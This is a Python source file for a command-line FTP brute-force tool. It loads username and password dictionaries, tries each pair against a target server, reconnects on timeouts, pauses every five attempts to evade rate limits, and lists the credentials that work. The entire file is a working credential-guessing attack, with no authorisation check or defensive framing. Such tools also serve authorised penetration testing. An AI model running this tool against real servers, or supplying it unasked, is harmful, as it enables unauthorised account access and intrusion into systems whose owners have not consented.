from ftplib import FTP, error_perm
from socket import timeout
from time import sleep
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from ftp_brute_force.load_dict import load_dict
from importlib.resources import files


class FtpBruteForce:
    """
    Create FTP object.
    Load username and password dictionary.
    Make a login attempt.
    Close connection.
    """

    def __init__(self, server_address, user_dict_path, password_dict_path, server_port=21):
        """
        :param server_address: FTP server IPv4 address.
        :param user_dict_path: Username dictionary path.
        :param password_dict_path: Password dictionary path.
        :param server_port: FTP server port, default is 21.
        """
        self.ftp = FTP()
        self.server_address = server_address
        self.user_dict_path = user_dict_path
        self.password_dict_path = password_dict_path
        self.server_port = server_port
        self.attempted_times = 0  # Connection counter

    @staticmethod
    def display_message(message: str, color: str = "red"):
        """
        :param message: Information to be displayed.(String)
        :param color: Specifies the color of the displayed message, which defaults to red.
        """
        try:
            match color:
                case "red":
                    print(f"\033[1;31m{message}\033[0m")
                case "green":
                    print(f"\033[1;32m{message}\033[0m")
                case "yellow":
                    print(f"\033[1;33m{message}\033[0m")
                case _:
                    print(message)
        except ValueError:
            print("The data type must be 'str'.")

    @staticmethod
    def stop(max_num: int):  # When the number of attempts reaches a certain value, sleep for 5 seconds
        """
        :param max_num: The number of attempts already made.
        """
        try:
            if max_num % 5 == 0:
                sleep(5)
        except ValueError:
            print("The data type must be 'int'.")

    def reconnect(self, connection=False):
        """
        :param connection: Do you need to reconnect? Default does not reconnect.
        """
        try:
            # Try sending a simple FTP command to check if the connection is still valid.
            self.ftp.voidcmd("NOOP")
        except (BrokenPipeError, EOFError, TimeoutError, error_perm):
            # If these four exceptions are thrown,
            # the connection may have been disconnected and put into sleep for 5 seconds.
            self.stop(5)
        finally:
            # Try reconnecting regardless of whether the connection has been disconnected or not.
            if not connection:
                self.ftp.connect(self.server_address, self.server_port, timeout=10)
                self.ftp.set_pasv(True)

    def get_mode(self) -> int | None:
        """
        :return: mode number.(int)
        """
        while True:
            # Blasting mode selection.
            try:
                mode = int(input("""1. Try all usernames and dictionaries in the dictionary
2. Single blasting\n0. Exit\nPlease enter login mode:"""))
                match mode:
                    case 0:
                        exit(0)
                    case 1 | 2:
                        return mode
                    case _:
                        self.display_message("The login mode entered is invalid. Please enter 1 or 2.")
                        continue
            except ValueError:
                self.display_message("The login mode entered is invalid. Please enter 1 or 2.")
                continue

    def connection(self):
        while True:
            if self.attempted_times == 5:
                self.display_message("""Failed to connect five times, attempting to reconnect,
please wait at least 5 seconds""")
                self.stop(self.attempted_times)
                self.reconnect(connection=True)
            else:
                try:
                    reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
                    if "220" in reply:
                        self.display_message("Connection successful, FTP service ready!", color="green")
                        self.ftp.set_pasv(True)
                        break
                except ConnectionRefusedError as connect_error:
                    self.attempted_times += 1
                    self.display_message(f"""Error:{connect_error},the connection was denied,
the service may not be running or the maximum number of connections may have been reached.""")
                    continue
                except (TimeoutError, timeout) as timeout_error:
                    self.attempted_times += 1
                    self.display_message(f"""Error:{timeout_error},Connection timeout,
please check if the network connection and FTP server are functioning properly.""")
                    continue

        self.attempted_times = 0  # Reset counter.

    def brute(self):
        success_login: dict = dict()
        mode = self.get_mode()

        for user, password in load_dict(user_dict_path=self.user_dict_path, password_dict_path=self.password_dict_path):
            self.attempted_times = 0

            while self.attempted_times < 6:
                try:
                    replay = self.ftp.login(user, password)
                    if "230" in replay and mode == 1:
                        self.display_message(f"Login successful! user:{user}, password:{password}", color="green")
                        success_login[user] = password
                        self.ftp.close()
                        self.connection()
                        break
                    elif "230" in replay and mode == 2:
                        self.display_message(f"Login successful! user:{user}, password:{password}", color="green")
                        self.ftp.close()
                        exit(0)
                except error_perm as error:
                    if "530 Permission denied" in str(error):
                        self.display_message(f"user:{user} password:{password} Login failed, access denied!")
                        break
                    elif "530 Login incorrect" in str(error):
                        self.display_message(f"user:{user} password:{password} Login failed!")
                        break
                    elif "530 User cannot log in" in str(error):
                        self.display_message(f"user:{user} password:{password} Login failed, user cannot log in!")
                        break
                    else:
                        pass
                except (TimeoutError, BrokenPipeError):
                    self.display_message(f"user:{user} password:{password} Login timeout!")
                    self.attempted_times += 1
                    if self.attempted_times >= 5:
                        self.display_message(f"""The current attempt count exceeds the limit,
and this user password combination will be skipped.""")
                        break
                    else:
                        self.reconnect()
                        continue
                except (EOFError, ConnectionResetError):
                    self.reconnect()
                    continue

        print("The following are valid login information:")
        for key, value in success_login.items():
            self.display_message(message=f"user:{key} password:{value}", color="yellow")

    def close(self):
        self.ftp.close()
        self.display_message("Connection closed!", color="green")


def main():
    commit = str(r"""
     _____   _____   ____      ____                   _              _____                              
    |  ___| |_   _| |  _ \    | __ )   _ __   _   _  | |_    ___    |  ___|   ___    _ __    ___    ___ 
    | |_      | |   | |_) |   |  _ \  | '__| | | | | | __|  / _ \   | |_     / _ \  | '__|  / __|  / _ \
    |  _|     | |   |  __/    | |_) | | |    | |_| | | |_  |  __/   |  _|   | (_) | | |    | (__  |  __/
    |_|       |_|   |_|       |____/  |_|     \__,_|  \__|  \___|   |_|      \___/  |_|     \___|  \___|                                                                                                                                                                                         
    """)

    try:
        version = files("ftp_brute_force").joinpath("VERSION").read_text(encoding="utf-8").strip()
    except FileNotFoundError:
        version = "unknown"

    parser = ArgumentParser(
        description=commit,
        formatter_class=RawDescriptionHelpFormatter
    )

    parser.add_argument("-s", "--server", dest="server", help="FTP server address", required=True)
    parser.add_argument("--port", dest="port", help="FTP server port (default: 21)", type=int, default=21)
    parser.add_argument("-u", "--user", dest="user", help="Username dictionary path", required=True)
    parser.add_argument("--password", dest="password", help="Password dictionary path", required=True)
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {version}",
                        help="Show version information and exit")
    args = parser.parse_args()

    fbf = FtpBruteForce(server_address=args.server, server_port=args.port,
                        user_dict_path=args.user, password_dict_path=args.password)
    fbf.connection()
    fbf.brute()


if __name__ == '__main__':
    main()
